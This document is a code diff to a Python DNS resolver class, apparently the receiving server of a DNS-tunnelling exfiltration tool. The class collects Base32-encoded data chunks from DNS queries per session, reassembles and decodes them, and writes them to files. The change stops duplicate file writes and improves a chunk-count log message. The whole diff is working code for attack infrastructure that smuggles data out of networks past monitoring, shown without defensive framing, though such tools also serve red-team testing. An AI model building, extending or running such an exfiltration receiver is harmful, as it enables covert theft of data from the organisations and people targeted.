@@ -75,6 +75,7 @@ class ExfiltrationResolver(BaseResolver):
         self.expected_total_chunks: Dict[str, int] = {}
         self.session_first_seen: Dict[str, float] = {}
         self.session_last_activity: Dict[str, float] = {}
+        self.session_written: Dict[str, bool] = {}  # Track if we've written a file for this session
         self.quiet = quiet
         self._rate_limit_timestamps: deque = deque()
 
@@ -95,6 +96,7 @@ class ExfiltrationResolver(BaseResolver):
             self.expected_total_chunks.pop(oldest_id, None)
             self.session_first_seen.pop(oldest_id, None)
             self.session_last_activity.pop(oldest_id, None)
+            self.session_written.pop(oldest_id, None)
             candidates.remove(oldest_id)
             total_chunks = sum(len(c) for c in self.data_chunks.values())
 
@@ -108,6 +110,7 @@ class ExfiltrationResolver(BaseResolver):
                 self.expected_total_chunks.pop(sid, None)
                 self.session_first_seen.pop(sid, None)
                 self.session_last_activity.pop(sid, None)
+                self.session_written.pop(sid, None)
 
     def resolve(self, request, handler):  # type: ignore[override]
         query_name = str(request.q.qname)
@@ -256,10 +259,17 @@ class ExfiltrationResolver(BaseResolver):
             if len(combined_data) % 8 not in (0, 2, 4, 5, 7):
                 return
 
+            # Only write once per session to avoid multiple files
+            if self.session_written.get(session_id, False):
+                return
+
             # When DONE was received, only write when we have exactly expected chunks.
             expected = self.expected_total_chunks.get(session_id)
-            if expected is not None and len(available_chunks) != expected:
-                return
+            if expected is not None:
+                if len(available_chunks) != expected:
+                    return
+            # If DONE not received (backward compat), write when we have valid length
+            # (but only once - the flag above prevents multiple writes)
 
             try:
                 # Decode Base32 (handles padding; only called when length is valid)
@@ -273,11 +283,15 @@ class ExfiltrationResolver(BaseResolver):
                     f.flush()
                 
                 chunk_count = len(available_chunks)
+                expected = self.expected_total_chunks.get(session_id)
+                expected_str = f"{chunk_count}/{expected}" if expected else f"{chunk_count}/{chunk_count}"
                 print(
                     f"{Style.BRIGHT}{Fore.GREEN}[+] "
                     f"{Style.BRIGHT}{Fore.GREEN}Data written to {output_file} "
-                    f"Session {session_id}: {chunk_count}/{chunk_count} chunks, {len(decoded_bytes)} bytes"
+                    f"Session {session_id}: {expected_str} chunks, {len(decoded_bytes)} bytes"
                 )
+                # Mark session as written to prevent duplicate writes
+                self.session_written[session_id] = True
             except binascii.Error as e:
                 print(
                     f"{Fore.RED}{Style.BRIGHT}[-] Failed to decode Base32 data for session {session_id}: {e}\n"
